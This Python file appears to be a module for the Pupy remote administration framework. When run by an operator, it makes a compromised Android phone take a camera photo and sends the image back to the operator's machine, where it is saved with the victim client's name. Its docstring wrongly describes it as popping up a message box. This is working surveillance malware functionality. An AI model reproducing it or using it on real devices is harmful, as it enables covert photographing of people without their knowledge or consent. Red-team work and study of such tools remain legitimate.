# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import os
import datetime
import os.path
import subprocess

__class_name__="AndroidCameraSnap"

class AndroidCameraSnap(PupyModule):
	""" Pop up a custom message box """
	dependencies=['pupydroid.camera']
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="camera", description=self.__doc__)
		self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='Change the camera id (default 0=back camera)')
		self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')

	@android_only
	def is_compatible(self):
		pass

	def run(self, args):
		try:
			os.makedirs(os.path.join("data","webcam_snaps"))
		except Exception:
			pass
		data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device)
		filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
		with open(filepath,"w") as f:
			f.write(data)
		if args.view:
			subprocess.Popen(["eog",filepath])

		self.success("camera picture saved to %s"%filepath)

